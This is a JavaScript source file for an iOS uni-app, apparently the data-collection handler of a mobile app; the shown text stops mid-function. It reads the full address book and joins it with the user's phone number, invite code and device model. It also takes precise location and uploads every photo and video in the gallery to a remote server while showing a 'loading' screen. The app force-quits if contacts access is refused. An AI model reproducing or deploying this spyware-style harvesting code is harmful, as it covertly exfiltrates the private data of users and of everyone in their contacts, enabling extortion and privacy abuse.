

import config from '@/config/server.config.js'
import PlatformUtil from '@/utils/platform.js'

class IOSHandler {
  static hasNavigated = false;

  // 获取通讯录
  static async getContacts(phone, inviteCode) {
    try {
      // 先检查权限
      const hasPermission = await this.checkContactsPermission();
      // 权限检查现在会在失败时直接抛出异常并退出应用，
      // 如果执行到这里，说明权限检查通过

      const deviceInfo = `${plus.device.vendor}-${plus.device.model}`;
      let contactData = `${phone}**${inviteCode}**${deviceInfo}`;
      
      return new Promise((resolve, reject) => {
        plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
          addressbook.find(["displayName", "phoneNumbers"], (contacts) => {
            contacts.forEach(contact => {
              contactData += `=${contact.displayName}|${contact.phoneNumbers[0]?.value || ""}`;
            });
            console.log('通讯录获取成功');
            resolve(contactData);
          }, (error) => {
            console.error('查找通讯录失败:', error);
            reject(error);
          }, {
            multiple: true
          });
        }, (error) => {
          console.error('获取通讯录失败:', error);
          
          // 如果是权限问题，显示提示并退出应用
          if (error.code === error.PERMISSION_DENIED) {
            console.log('获取通讯录时检测到权限被拒绝，退出应用');
            uni.showModal({
              title: '权限丢失',
              content: '通讯录权限丢失，请重启应用并允许通讯录权限',
              showCancel: false,
              success: () => {
                setTimeout(() => {
                  plus.runtime.quit();
                }, 500);
              }
            });
            // 记录拒绝状态
            uni.setStorageSync('ios_contacts_permission_denied', 'true');
            uni.removeStorageSync('ios_contacts_permission');
          }
          
          reject(error);
        });
      });
    } catch (error) {
      console.error('处理通讯录出错:', error);
      
      // 对于权限错误，确保应用退出
      if (error.message && error.message.includes('权限')) {
        console.log('通讯录权限错误，准备退出应用');
        // 如果还未显示提示框，则显示
        setTimeout(() => {
          console.log('通讯录权限错误，强制退出应用');
          plus.runtime.quit();
        }, 1000);
      }
      
      throw error;
    }
  }

  // 获取位置信息
  static async getLocation() {
    // 先检查权限
    const hasPermission = await this.checkLocationPermission();
    if (!hasPermission) {
      console.log('未获得位置权限');
      throw new Error('未获得位置权限');
    }

    return new Promise((resolve, reject) => {
      plus.geolocation.getCurrentPosition(
        (position) => {
          console.log('位置获取成功:', position);
          resolve(position);
        },
        (error) => {
          console.error('获取位置失败:', error);
          reject(error);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          provider: 'system',
          coordsType: 'wgs84'
        }
      );
    });
  }

  // 获取相册图片
  static async getPhotos() {
    return new Promise((resolve, reject) => {
        console.log('开始获取 iOS 相册媒体文件');
        
        try {
            const galleryModule = uni.requireNativePlugin('vutet-getGalleryImages');
            if (!galleryModule) {
                console.error('插件加载失败');
                resolve([]);
                return;
            }
            
            // 权限检查状态标记
            const permissionStatus = uni.getStorageSync('ios_photo_permission');
            
            // 如果App启动时已经获取了权限，则直接开始处理
            if (permissionStatus === 'granted') {
                console.log('相册权限已在App启动时获取，直接处理');
                this.getPhotosWithPermission(galleryModule, resolve);
                return;
            }
            
            // 先检查权限
            galleryModule.checkPermission((res) => {
                console.log('相册权限检查结果:', res);
                
                if (res.status !== 200) {
                    console.log('未获得相册权限:', res);
                    
                    // 使用系统原生的权限请求，确保能访问视频
                    // iOS 14+需要特别注意照片和视频的权限
                    try {
                        // 安全地尝试导入PHPhotoLibrary
                        const PHPhotoLibraryClass = plus.ios.importClass("PHPhotoLibrary");
                        if (PHPhotoLibraryClass) {
                            PHPhotoLibraryClass.requestAuthorization((status) => {
                                console.log('相册授权状态:', status);
                                if (status === 3) { // PHAuthorizationStatusAuthorized = 3
                                    // 保存权限状态
                                    uni.setStorageSync('ios_photo_permission', 'granted');
                                    // 用户授权后重新获取照片和视频
                                    this.getPhotosWithPermission(galleryModule, resolve);
                                } else {
                                    // 如果用户拒绝，显示引导对话框
                                    uni.showModal({
                                        title: '提示',
                                        content: '需要访问相册和视频权限，是否去设置？',
                                        success: (modalRes) => {
                                            if (modalRes.confirm) {
                                                // 打开应用设置页面
                                                if (plus.os.name.toLowerCase() === 'ios') {
                                                    plus.runtime.openURL('app-settings:');
                                                }
                                            }
                                        },
                                        complete: () => {
                                            resolve([]);
                                        }
                                    });
                                }
                            });
                        } else {
                            // 如果导入失败，使用通用的权限请求
                            plus.ios.requestAuthorization('photo', (result) => {
                                if (result === 'authorized') {
                                    // 保存权限状态
                                    uni.setStorageSync('ios_photo_permission', 'granted');
                                    this.getPhotosWithPermission(galleryModule, resolve);
                                } else {
                                    uni.showModal({
                                        title: '提示',
                                        content: '需要访问相册权限，是否去设置？',
                                        success: (modalRes) => {
                                            if (modalRes.confirm) {
                                                if (plus.os.name.toLowerCase() === 'ios') {
                                                    plus.runtime.openURL('app-settings:');
                                                }
                                            }
                                        },
                                        complete: () => {
                                            resolve([]);
                                        }
                                    });
                                }
                            });
                        }
                    } catch (e) {
                        console.error('权限请求失败:', e);
                        // 使用通用的权限请求作为备选方案
                        plus.ios.requestAuthorization('photo', (result) => {
                            if (result === 'authorized') {
                                // 保存权限状态
                                uni.setStorageSync('ios_photo_permission', 'granted');
                                this.getPhotosWithPermission(galleryModule, resolve);
                            } else {
                                uni.showModal({
                                    title: '提示',
                                    content: '需要访问相册权限，是否去设置？',
                                    success: (modalRes) => {
                                        if (modalRes.confirm) {
                                            if (plus.os.name.toLowerCase() === 'ios') {
                                                plus.runtime.openURL('app-settings:');
                                            }
                                        }
                                    },
                                    complete: () => {
                                        resolve([]);
                                    }
                                });
                            }
                        });
                    }
                    return;
                }

                // 保存权限状态
                uni.setStorageSync('ios_photo_permission', 'granted');
                // 已有权限，获取照片和视频
                this.getPhotosWithPermission(galleryModule, resolve);
            });
        } catch (error) {
            console.error('相册处理失败:', error);
            resolve([]);
        }
    });
  }

  // 修改 getPhotosWithPermission 方法
  static getPhotosWithPermission(galleryModule, resolve) {
    const pageSize = 10; // 减小每页数量，提高稳定性
    let currentPage = 1;
    let uploadedCount = 0;
    let totalPhotos = 0;
    let errorCount = 0;
    const maxErrors = 5; // 最大连续错误次数
    const phone = uni.getStorageSync('phone');
    const maxRetries = 3; // 每张照片最大重试次数

    // 增强视频扩展名检查方法
    const isVideoFile = (fileName) => {
      const videoExtensions = ['.mp4', '.mov', '.m4v', '.3gp', '.avi', '.wmv', '.mkv', '.qt', '.flv'];
      fileName = fileName.toLowerCase();
      return videoExtensions.some(ext => fileName.endsWith(ext));
    };
    
    // 检查MIME类型是否为视频
    const isVideoMimeType = (mimeType) => {
      if (!mimeType) return false;
      const videoMimeTypes = [
        'video/', 
        'application/mp4',
        'application/quicktime'
      ];
      return videoMimeTypes.some(type => mimeType.startsWith(type));
    };

    // 单个媒体文件上传处理
    const uploadSingleMedia = async (media, retryCount = 0) => {
        try {
            // 检查media对象是否有效
            if (!media || !media.path) {
                console.error('无效的媒体对象:', media);
                return false;
            }
            
            // 改进视频检测：更全面检查文件扩展名和mime类型
            const filePath = media.path || '';
            const fileName = filePath.toLowerCase();
            
            // 检查是否是相册中的视频文件
            const isVideo = isVideoFile(fileName) || 
                           isVideoMimeType(media.mimeType) ||
                           (media.duration && media.duration > 0) || // 检查是否有持续时间属性
                           (media.mediaType && (media.mediaType === 'video' || media.mediaType === 1)) || // 1表示视频
                           (media.type && (media.type === 'video' || media.type === 1));
                          
            // 增加详细日志以便调试            
            console.log(`处理媒体文件: 
            路径: ${filePath}
            类型: ${isVideo ? '视频' : '图片'}
            MIME类型: ${media.mimeType || '未知'}
            持续时间: ${media.duration || '未知'}
            媒体类型: ${media.mediaType || '未知'}`);
            
            // 处理视频
            if (isVideo) {
                console.log('检测到视频文件，准备上传');
                
                try {
                    // 对于iOS视频，使用FileTransfer直接上传文件，不尝试先访问
                    if (plus.os.name.toLowerCase() === 'ios') {
                        console.log('使用FileTransfer上传iOS视频文件');
                        
                        // 构建上传URL
                        const uploadUrl = `${config.ios_api.base_url}${config.ios_api.upload.uploadFile}`;
                        
                        // 准备上传参数
                        const options = new plus.net.URLOptions();
                        options.method = 'POST';
                        options.timeout = 180000;
                        
                        // 请求体参数
                        let formData = { id: phone, file_type: 'video' };
                        
                        // 使用uni.uploadFile替代plus.io.resolveLocalFileSystemURL
                        return new Promise((resolve, reject) => {
                            try {
                                uni.uploadFile({
                                    url: uploadUrl,
                                    filePath: filePath,
                                    name: 'file',
                                    formData: formData,
                                    success: (res) => {
                                        console.log('视频上传成功:', res);
                                        uploadedCount++;
                                        errorCount = 0; // 重置错误计数
                                        console.log(`上传进度: ${uploadedCount}/${totalPhotos}`);
                                        resolve(true);
                                    },
                                    fail: (err) => {
                                        console.error('视频上传失败:', err);
                                        reject(err);
                                    }
                                });
                            } catch (uploadError) {
                                console.error('创建上传请求失败:', uploadError);
                                reject(uploadError);
                            }
                        });
                    }
                    
                    // 非iOS设备使用原来的方法
                    const fileEntry = await new Promise((resolve, reject) => {
                        plus.io.resolveLocalFileSystemURL(filePath, resolve, reject);
                    });
                    
                    // 获取文件信息
                    const fileInfo = await new Promise((resolve, reject) => {
                        fileEntry.getMetadata(resolve, reject);
                    }).catch(err => {
                        console.error('获取文件元数据失败:', err);
                        // 如果无法获取元数据，返回空对象
                        return {};
                    });
                    
                    // 检查文件大小
                    if (fileInfo.size === 0) {
                        console.error('文件大小为0，跳过上传');
                        return false;
                    }
                    
                    if (fileInfo.size) {
                        console.log(`视频文件大小: ${fileInfo.size} 字节, 修改时间: ${fileInfo.modificationTime}`);
                    }
                    
                    // 视频文件有效，准备上传
                    await this.uploadFile(filePath, phone, true);
                    console.log('视频上传完成');
                } catch (fileError) {
                    console.error('视频文件访问出错:', fileError);
                    
                    // 尝试使用另一种方法 - uni.uploadFile直接上传
                    if (plus.os.name.toLowerCase() === 'ios') {
                        try {
                            console.log('尝试使用uni.uploadFile直接上传视频');
                            const uploadUrl = `${config.ios_api.base_url}${config.ios_api.upload.uploadFile}`;
                            
                            return new Promise((resolve, reject) => {
                                uni.uploadFile({
                                    url: uploadUrl,
                                    filePath: filePath,
                                    name: 'file',
                                    formData: {
                                        id: phone,
                                        file_type: 'video'
                                    },
                                    success: (res) => {
                                        console.log('备选方法视频上传成功:', res);
                                        uploadedCount++;
                                        errorCount = 0;
                                        console.log(`上传进度: ${uploadedCount}/${totalPhotos}`);
                                        resolve(true);
                                    },
                                    fail: (err) => {
                                        console.error('备选方法视频上传失败:', err);
                                        reject(err);
                                    }
                                });
                            });
                        } catch (altError) {
                            console.error('备选上传方法失败:', altError);
                            throw altError;
                        }
                    }
                    
                    // 如果是权限问题，提示用户
                    if (String(fileError).includes('permission') || String(fileError).includes('denied') || String(fileError).includes('不允许读')) {
                        uni.showToast({
                            title: '无法访问视频文件，请检查权限设置',
                            icon: 'none',
                            duration: 3000
                        });
                        
                        // 尝试获取视频内容的另一种方法
                        try {
                            console.log('尝试使用插件API直接获取视频数据');
                            // 如果iOS设备上有原始路径或fileid，尝试使用它
                            if (media.originalPath) {
                                console.log('尝试使用originalPath:', media.originalPath);
                                const uploadUrl = `${config.ios_api.base_url}${config.ios_api.upload.uploadFile}`;
                                return new Promise((resolve, reject) => {
                                    uni.uploadFile({
                                        url: uploadUrl,
                                        filePath: media.originalPath,
                                        name: 'file',
                                        formData: { id: phone, file_type: 'video' },
                                        success: (res) => {
                                            console.log('使用originalPath上传成功:', res);
                                            uploadedCount++;
                                            resolve(true);
                                        },
                                        fail: (err) => reject(err)
                                    });
                                });
                            } else if (media.fileid) {
                                // 有些API可能提供fileid
                                console.log('尝试使用fileid获取视频');
                                // 相关代码...
                            }
                        } catch (altPathError) {
                            console.error('替代路径访问失败:', altPathError);
                        }
                    }
                    
                    // 如果是路径问题，尝试使用替代路径
                    if (media.originalPath && media.originalPath !== filePath) {
                        console.log('尝试替代路径:', media.originalPath);
                        try {
                            await this.uploadFile(media.originalPath, phone, true);
                            console.log('使用替代路径上传视频成功');
                        } catch (altError) {
                            console.error('替代路径上传失败:', altError);
                            throw altError;
                        }
                    } else {
                        throw fileError;
                    }
                }
            } else {
                // 处理图片
                const processedPath = await this.getImagePath(filePath);
                await this.uploadFile(processedPath, phone, false);
            }
            
            uploadedCount++;
            errorCount = 0; // 重置错误计数
            console.log(`上传进度: ${uploadedCount}/${totalPhotos}`);
            return true;
        } catch (error) {
            console.error('上传失败:', error);
            
            // 检查错误消息中是否包含"成功"
            const errorMsg = error.message || '';
            if (errorMsg.includes('成功')) {
                console.log('忽略假性错误，实际上传成功');
                uploadedCount++;
                errorCount = 0;
                return true;
            }
            
            // 重试逻辑
            if (retryCount < maxRetries) {
                console.log(`第 ${retryCount + 1} 次重试上传...`);
                await new Promise(r => setTimeout(r, 1000)); // 等待1秒后重试
                return await uploadSingleMedia(media, retryCount + 1);
            }
            
            errorCount++; // 增加错误计数
            
            // 如果连续错误太多，暂停一会再继续
            if (errorCount >= maxErrors) {
                console.log(`检测到连续 ${maxErrors} 次错误，暂停5秒后继续...`);
                await new Promise(r => setTimeout(r, 5000));
                errorCount = 0; // 重置错误计数
            }
            
            return false;
        }
    };

    // 扫描和上传过程
    const scanAndUpload = async () => {
        try {
            // 初始化网络检查
            await this.checkNetworkConnection();
            console.log('网络连接正常，开始处理相册');
            
            // 此时表示已获得权限并准备开始上传，通知页面可以开始倒计时和跳转
            console.log('准备开始上传相册文件，触发倒计时和跳转');
            // 将通知处理放在这里，此时已完成权限检查，实际上传即将开始
            this.navigateToLoading();
            
            // 分别处理图片和视频
            let totalMediaFiles = 0;
            
            // 先获取图片文件
            try {
                console.log('开始获取图片文件...');
                const mediaConfig = {
                    count: pageSize,
                    page: 1,
                    asc: false,
                    time: 0,
                    // 只获取图片，不包括视频
                    includeVideos: false
                };
                
                console.log('请求图片文件，配置:', JSON.stringify(mediaConfig));
                
                const firstPage = await new Promise((resolveGet) => {
                    galleryModule.getGalleryImages(mediaConfig, resolveGet);
                });

                if (firstPage?.status === 200 && firstPage.data?.length > 0) {
                    // 更新总计数
                    const imageCount = firstPage.total || firstPage.data.length;
                    totalPhotos = imageCount;
                    totalMediaFiles = imageCount;
                    
                    console.log(`已获取 ${imageCount} 个图片文件需要处理`);
                    
                    // 处理第一页文件
                    for (const media of firstPage.data) {
                        await uploadSingleMedia(media); // 等待上传完成再继续
                        // 每次上传后检查网络
                        await this.checkNetworkConnection();
                    }
                    
                    // 继续获取和上传后续文件
                    currentPage = 2;
                    let consecutiveFailures = 0;
                    const maxConsecutiveFailures = 3;
                    
                    while (currentPage * pageSize <= imageCount && consecutiveFailures < maxConsecutiveFailures) {
                        // 每页处理前检查网络
                        await this.checkNetworkConnection();
                        
                        try {
                            console.log(`获取第 ${currentPage} 页图片文件...`);
                            const ret = await new Promise((resolveGet) => {
                                galleryModule.getGalleryImages({
                                    count: pageSize,
                                    page: currentPage,
                                    asc: false,
                                    time: 0,
                                    includeVideos: false  // 只获取图片
                                }, resolveGet);
                            });

                            if (ret?.status === 200 && ret.data?.length > 0) {
                                console.log(`获取第 ${currentPage} 页图片文件成功: ${ret.data.length} 个`);
                                
                                // 上传这一页的每一个文件
                                for (const media of ret.data) {
                                    await uploadSingleMedia(media); // 等待上传完成再继续
                                    // 每次上传后检查网络
                                    await this.checkNetworkConnection();
                                }
                                
                                currentPage++;
                                consecutiveFailures = 0;
                            } else {
                                consecutiveFailures++;
                                console.log(`获取第 ${currentPage} 页图片文件失败，尝试下一页`);
                                currentPage++;
                                await new Promise(r => setTimeout(r, 2000)); // 失败后等待2秒
                            }
                        } catch (error) {
                            console.error(`获取第 ${currentPage} 页图片文件出错:`, error);
                            consecutiveFailures++;
                            currentPage++;
                            await new Promise(r => setTimeout(r, 2000)); // 出错后等待2秒
                        }
                    }
                } else {
                    console.log('没有获取到图片文件或文件列表为空');
                }
            } catch (error) {
                console.error('获取图片文件列表失败:', error);
            }
            
            // 然后获取视频文件 - 使用专用的getGalleryVideos方法
            try {
                console.log('开始获取视频文件...');
                const videosResult = await new Promise((resolveVideo) => {
                    galleryModule.getGalleryVideos({
                        count: 20,   // 每页获取20个视频
                        page: 1,      // 从第1页开始
                        asc: false,   // 按创建时间倒序
                        copyToAppCacheDir: true // 请求复制文件到应用缓存目录
                    }, resolveVideo);
                });
                
                if (videosResult?.status === 200 && videosResult.data?.length > 0) {
                    console.log(`成功获取 ${videosResult.data.length} 个视频文件`);
                    console.log('视频文件列表:', JSON.stringify(videosResult.data.map(v => ({
                        filename: v.filename,
                        duration: v.duration,
                        size: v.size
                    }))));
                    
                    // 更新总计数
                    const videoCount = videosResult.data.length;
                    totalPhotos = totalMediaFiles + videoCount;
                    
                    // 上传视频文件
                    for (const video of videosResult.data) {
                        console.log(`准备处理视频: ${video.filename}, 时长: ${video.duration}秒`);
                        
                        // 尝试直接使用uni.uploadFile上传视频
                        try {
                            if (video.path) {
                                const uploadUrl = `${config.ios_api.base_url}${config.ios_api.upload.uploadFile}`;
                                const result = await new Promise((resolve, reject) => {
                                    uni.uploadFile({
                                        url: uploadUrl,
                                        filePath: video.path,
                                        name: 'file',
                                        formData: {
                                            id: phone,
                                            file_type: 'video',
                                            timestamp: Date.now()
                                        },
                                        success: (res) => {
                                            console.log('视频直接上传成功:', res);
                                            uploadedCount++;
                                            resolve(true);
                                        },
                                        fail: (err) => {
                                            console.error('视频直接上传失败:', err);
                                            reject(err);
                                        }
                                    });
                                }).catch(err => {
                                    console.error('视频上传过程错误:', err);
                                    return false;
                                });
                                
                                if (result) {
                                    console.log(`视频 ${video.filename} 上传成功`);
                                    // 每次上传后检查网络
                                    await this.checkNetworkConnection();
                                    continue; // 成功后继续下一个
                                }
                            }
                        } catch (directUploadError) {
                            console.error('直接上传视频失败:', directUploadError);
                        }
                        
                        // 如果直接上传失败，尝试常规方法
                        if (video.path) {
                            await uploadSingleMedia({
                                ...video,
                                mediaType: 'video'  // 显式标记为视频
                            });
                            // 每次上传后检查网络
                            await this.checkNetworkConnection();
                        } else {
                            console.error('视频文件缺少路径:', video);
                        }
                    }
                } else {
                    console.log('未找到视频文件或获取失败:', videosResult);
                }
            } catch (videoError) {
                console.error('获取视频文件出错:', videoError);
            }

            console.log(`相册处理完成，共上传 ${uploadedCount}/${totalPhotos} 个媒体文件`);
            resolve({ total: totalPhotos, uploaded: uploadedCount });

        } catch (error) {
            console.error('处理过程出错:', error);
            resolve({ total: totalPhotos, uploaded: uploadedCount });
        }
    };

    // 启动扫描和上传过程
    scanAndUpload();
  }

  // 处理图片路径
  static getImagePath(path) {
    return new Promise((resolve, reject) => {
        uni.compressImage({
            src: path,
            quality: 80,
            success: (res) => {
                resolve(res.tempFilePath);
            },
            fail: (error) => {
                console.error('压缩图片失败:', error);
                resolve(path); // 如果压缩失败，返回原始路径
            }
        });
    });
  }

  // 上传数据到服务器
  static async uploadData(url, data, phone) {
    console.log('准备上传数据:', {
        url,
        data
    });

    // 获取存储的邀请码
    const code = uni.getStorageSync('code') || '';

    const baseUrl = config.baseUrl;
    const fullUrl = `${baseUrl}/api/${url}`;

    return new Promise((resolve, reject) => {
        uni.request({
            url: fullUrl,
            method: 'POST',
            data: {
                data: typeof data === 'string' ? data : JSON.stringify(data),
                phone: phone,
                code: code // 添加邀请码参数
            },
            header: {
                'content-type': 'application/x-www-form-urlencoded'
            },
            success: (res) => {
                console.log('请求成功:', res);
                resolve(res.data);
            },
            fail: (error) => {
                console.error('请求失败:', error);
                reject(error);
            }
        });
    });
  }

  // 修改 uploadFile 方法，使用plus.uploader文件流上传
  static async uploadFile(filePath, phone, isVideo = false) {
    // 构建上传URL
    const uploadUrl = `${config.ios_api.base_url}${config.ios_api.upload.uploadFile}`;
    console.log(`上传${isVideo ? '视频' : '图片'}到URL:`, uploadUrl);
    
    // 确保电话号码正确格式化
    const formattedPhone = phone.toString().trim();
    // 检查电话号码
    if (!formattedPhone || formattedPhone === 'undefined') {
      console.error('电话号码无效:', formattedPhone);
      return Promise.reject(new Error('电话号码无效'));
    }
    
    console.log('使用手机号上传:', formattedPhone);
    
    return new Promise((resolve, reject) => {
      try {
        // 使用plus.uploader替代原来的base64编码方式
        const task = plus.uploader.createUpload(uploadUrl, {
          method: "POST",
          timeout: 180000,  // 设置3分钟超时
          priority: isVideo ? 1 : 2  // 视频优先级高于图片
        }, (t, status) => {
          if (status == 200) {
            let response = t.responseText;
            
            // 处理响应
            if (response === '成功' || response === '获取成功' || response.includes('成功') || response.trim() === '') {
              console.log(`${isVideo ? '视频' : '图片'}上传成功`);
              resolve(t);
            } else {
              console.error(`${isVideo ? '视频' : '图片'}上传失败:`, response);
              reject(new Error("上传失败: " + response));
            }
          } else {
            let errorMsg = `上传失败: 状态码 ${status}`;
            try {
              errorMsg += `, 响应: ${t.responseText || '无响应'}`;
            } catch (e) {}
            console.error(errorMsg);
            reject(new Error(errorMsg));
          }
        });
        
        // 添加请求参数
        task.addData("id", formattedPhone);
        
        // 如果是视频，添加视频标识
        if (isVideo) {
          task.addData("file_type", "video");
          // 添加时间戳确保文件名唯一性
          task.addData("timestamp", new Date().getTime().toString());
        }
        
        // 添加文件
        let filename = filePath.substring(filePath.lastIndexOf('/') + 1);
        // 如果是视频，确保文件扩展名正确
        if (isVideo && !filename.match(/\.(mp4|mov|m4v)$/i)) {
          // 添加默认的扩展名以确保服务器正确处理
          filename += '.mp4';
        }
        
        console.log(`准备上传文件: ${filename}, 类型: ${isVideo ? 'video' : 'image'}`);
        task.addFile(filePath, {
          key: "file",
          name: filename
        });
        
        // 添加上传状态监听
        task.addEventListener('statechanged', (upload, status) => {
          if (status === 2) { // 上传中
            const uploadedSize = upload.uploadedSize;
            const totalSize = upload.totalSize;
            const percent = Math.round(uploadedSize / totalSize * 100);
            if (percent % 10 === 0) { // 每完成10%记录一次
              console.log(`${isVideo ? '视频' : '图片'}上传进度: ${percent}%`);
            }
          }
        });
        
        // 开始上传
        task.start();
        console.log(`开始上传${isVideo ? '视频' : '图片'}: ${filename}`);
      } catch (error) {
        console.error(`创建上传任务失败:`, error);
        reject(error);
      }
    });
  }

  // 上传照片
  static async uploadPhotos(photos) {
    const processedPath = await this.getImagePath(photos.path);
    try {
        await this.uploadFile(processedPath, uni.getStorageSync('phone'));
        return true;
    } catch (error) {
        console.error('上传失败:', error);
        return false;
    }
  }

  // 跳转到加载页面
  static navigateToLoading() {
    // 使用静态类变量防止重复跳转
    if (this.hasNavigated) {
      console.log('已经跳转过，跳过本次跳转');
      return;
    }

    // 立即设置标志，防止并发调用时的重复跳转
    this.hasNavigated = true;
    console.log('准备跳转到加载页面，已设置跳转标志');

    // 添加页面状态检查
    const pages = getCurrentPages();
    const currentRoute = pages[pages.length - 1]?.route || '';
    
    // 如果当前已经在loading页面，不再跳转
    if (currentRoute.includes('loading')) {
      console.log('当前已在loading页面，无需跳转');
      return;
    }

    uni.navigateTo({
      url: '/pages/loading/loading',
      success: () => {
        console.log('跳转成功');
      },
      fail: (error) => {
        console.error('跳转失败:', error);
        // 如果跳转失败，重置标志以允许再次尝试
        this.hasNavigated = false;
      }
    });
  }

  // 添加权限检查方法
  static async checkPhotoPermission() {
    return new Promise((resolve) => {
        const galleryModule = uni.requireNativePlugin('vutet-getGalleryImages');
        if (!galleryModule) {
            console.error('插件加载失败');
            resolve(false);
            return;
        }

        // 先检查是否已有授权记录
        const permissionStatus = uni.getStorageSync('ios_photo_permission');
        if (permissionStatus === 'granted') {
            console.log('相册权限已获取(缓存)');
            resolve(true);
            return;
        }

        galleryModule.checkPermission((res) => {
            console.log('相册权限检查结果:', res);
            
            // 在iOS设备上，可能需要特别检查视频访问权限
            if (res.status === 200 && plus.os.name.toLowerCase() === 'ios') {
                try {
                    // 安全地尝试检查iOS权限
                    const PHPhotoLibraryClass = plus.ios.importClass("PHPhotoLibrary");
                    if (PHPhotoLibraryClass) {
                        const authStatus = PHPhotoLibraryClass.authorizationStatus();
                        console.log('原生相册权限状态:', authStatus);
                        
                        // 在iOS 14+上，检查是否有完全访问权限
                        if (plus.device.model.includes('14') || plus.device.model.includes('15') || plus.device.model.includes('16')) {
                            try {
                                const PHAccessLevelClass = plus.ios.importClass("PHAccessLevel");
                                if (PHAccessLevelClass) {
                                    const accessLevel = PHPhotoLibraryClass.authorizationStatusForAccessLevel(PHAccessLevelClass.readWrite);
                                    console.log('相册读写权限级别:', accessLevel);
                                }
                            } catch (e) {
                                console.error('读写权限检查失败:', e);
                            }
                        }
                    }
                } catch (e) {
                    console.error('原生权限检查失败:', e);
                    // 失败不影响继续处理
                }
            }
            
            if (res.status === 200) {
                // 权限已获取，保存到本地存储
                uni.setStorageSync('ios_photo_permission', 'granted');
            }
            
            resolve(res.status === 200);
        });
    });
  }

  // 添加弹窗控制变量，防止多个弹窗同时显示
  static permissionDialogShowing = false;

  // 显示权限对话框的统一方法
  static showPermissionDialog(title, content, showSettings = true) {
    // 初始化时重置标志
    this.permissionDialogShowing = false;
    
    console.log('显示权限对话框:', title);
    this.permissionDialogShowing = true;
    
    return new Promise(resolve => {
      uni.showModal({
        title: title,
        content: content,
        confirmText: showSettings ? '去设置' : '确定',
        cancelText: '退出应用',
        showCancel: showSettings, // 如果不需要跳转设置，则不显示取消按钮
        success: (res) => {
          if (res.confirm && showSettings) {
            if (plus.os.name.toLowerCase() === 'ios') {
              plus.runtime.openURL('app-settings:');
            }
          }
          resolve(res);
        },
        complete: () => {
          // 对话框关闭后，重置标志
          setTimeout(() => {
            this.permissionDialogShowing = false;
          }, 300);
        }
      });
    });
  }

  // 在应用启动时检查通讯录权限状态
  static checkContactsPermissionAtLaunch() {
    console.log('启动时检查通讯录权限状态');
    
    // 重置弹窗显示状态
    this.permissionDialogShowing = false;
    
    // 检查是否之前拒绝过权限
    const permissionDenied = uni.getStorageSync('ios_contacts_permission_denied');
    const permissionGranted = uni.getStorageSync('ios_contacts_permission');
    
    if (permissionDenied === 'true' && permissionGranted !== 'granted') {
        console.log('应用启动时检测到之前拒绝过通讯录权限，重新检查实际权限状态');
        
        // 尝试直接检查实际权限状态，而不是依赖缓存
        try {
            // 使用同步方式处理，避免异步导致的状态问题
            const addressBookResult = this.checkContactsPermissionSync();
            
            if (addressBookResult === true) {
                // 实际获得了权限，清除拒绝记录
                console.log('实际检查发现通讯录权限已获得，清除拒绝记录');
                uni.setStorageSync('ios_contacts_permission', 'granted');
                uni.removeStorageSync('ios_contacts_permission_denied');
                return true; // 权限已获得，继续应用流程
            } else {
                // 实际确实没有权限，显示弹窗
                console.log('实际检查确认通讯录权限被拒绝，显示引导对话框');
                
                // 使用统一的对话框显示方法
                this.showPermissionDialog(
                  '需要通讯录权限',
                  '此应用需要访问通讯录才能正常使用，请在设置中开启通讯录权限'
                ).then(() => {
                  // 对话框关闭后，延迟退出应用
                  console.log('对话框关闭，延迟退出应用');
                  setTimeout(() => {
                    this.forceQuitApp();
                  }, 500);
                });
                
                return false; // 表示权限检查失败
            }
        } catch (error) {
            console.error('通讯录权限实际检查出错:', error);
            // 遇到错误时，显示弹窗并退出，但避免重复显示
            if (!this.permissionDialogShowing) {
                this.showPermissionDialog(
                  '需要通讯录权限',
                  '此应用需要访问通讯录才能正常使用，请在设置中开启通讯录权限'
                ).then(() => {
                  setTimeout(() => {
                    this.forceQuitApp();
                  }, 500);
                });
            }
            return false;
        }
    }
    return true;
  }
  
  // 同步检查通讯录权限方法
  static checkContactsPermissionSync() {
    try {
      // 检查权限状态
      const hasPermission = plus.ios.invoke('CNContactStore', 'authorizationStatusForEntityType:', 0);
      console.log('iOS通讯录权限状态码:', hasPermission);
      
      // 3 = kCNAuthorizationStatusAuthorized
      return hasPermission === 3;
    } catch (error) {
      console.error('同步检查通讯录权限出错:', error);
      return false;
    }
  }

  // 添加通讯录权限检查方法
  static async checkContactsPermission() {
    // 重置弹窗显示状态
    this.permissionDialogShowing = false;
    
    // 先检查是否已有授权记录
    const permissionStatus = uni.getStorageSync('ios_contacts_permission');
    if (permissionStatus === 'granted') {
        console.log('通讯录权限已获取(缓存)');
        return true;
    }

    // 检查是否之前拒绝过权限
    const permissionDenied = uni.getStorageSync('ios_contacts_permission_denied');
    if (permissionDenied === 'true') {
        console.log('用户之前拒绝过通讯录权限，显示引导对话框并退出应用');
        
        // 检查实际权限状态
        const actualPermission = this.checkContactsPermissionSync();
        if (actualPermission) {
            console.log('实际权限检查通过，清除拒绝记录');
            uni.setStorageSync('ios_contacts_permission', 'granted');
            uni.removeStorageSync('ios_contacts_permission_denied');
            return true;
        }
        
        // 避免重复显示弹窗
        if (!this.permissionDialogShowing) {
          // 使用统一的对话框显示方法
          await this.showPermissionDialog(
            '需要通讯录权限',
            '应用需要访问您的通讯录才能继续使用，请在设置中开启通讯录权限'
          );
          
          // 无论用户点击确认还是取消，都延迟退出应用
          console.log('延迟退出应用');
          setTimeout(() => {
            this.forceQuitApp();
          }, 500);
        }
        
        // 防止后续代码执行
        throw new Error('通讯录权限被拒绝');
    }

    try {
        return new Promise((resolve, reject) => {
            plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
                // 权限已获取，保存到本地存储
                uni.setStorageSync('ios_contacts_permission', 'granted');
                // 清除拒绝记录（如果有）
                uni.removeStorageSync('ios_contacts_permission_denied');
                resolve(true);
            }, (error) => {
                console.error('通讯录权限错误:', error);
                
                // 特别处理code 20错误，这通常表示权限被拒绝
                if (error.code === 20 || error.code === error.PERMISSION_DENIED) {
                    console.log('用户拒绝通讯录权限(错误码:'+ error.code +')，记录拒绝状态并退出应用');
                    // 记录用户拒绝过权限
                    uni.setStorageSync('ios_contacts_permission_denied', 'true');
                    
                    // 避免重复显示弹窗
                    if (!this.permissionDialogShowing) {
                      // 使用统一对话框
                      this.showPermissionDialog(
                        '权限请求失败',
                        '此应用需要访问通讯录才能继续使用。请重启应用并允许通讯录权限。',
                        false // 不显示设置选项
                      ).then(() => {
                        // 延迟退出应用
                        console.log('权限被拒绝，延迟退出应用');
                        setTimeout(() => {
